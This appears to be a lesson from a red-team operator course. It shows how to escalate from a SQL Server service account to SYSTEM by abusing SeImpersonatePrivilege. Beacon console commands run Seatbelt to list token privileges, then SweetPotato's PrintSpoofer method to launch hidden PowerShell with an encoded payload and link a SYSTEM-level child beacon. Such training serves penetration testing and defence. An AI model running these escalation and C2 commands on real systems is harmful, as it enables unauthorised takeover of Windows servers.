This instance of SQL is running as `NT Service\MSSQL$SQLEXPRESS`, which is generally configured by default on more modern SQL installers. It has a special type of privilege called `SeImpersonatePrivilege`. This allows the account to "impersonate a client after authentication".

```
beacon> getuid
[*] You are NT Service\MSSQL$SQLEXPRESS

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges

====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
                
[*] Completed collection in 0.01 seconds
```

In a nutshell, this privilege allows the user to impersonate a token that it's able to get a handle to. However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. SYSTEM) already running on the machine.

A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.

[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.

```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAF[...snip...]ApAA=="

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering notification on evil PIPE \\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 4444
[*] Tasked to connect to localhost:4444
[+] host called home, sent: 20 bytes
[+] established link to child beacon: 10.10.18.221
```
  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/sql01-system.png)

  

 > SweetPotato needs to be compiled in Release mode, to ensure the [NtApiDotNet](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtApiDotNet) assembly is merged.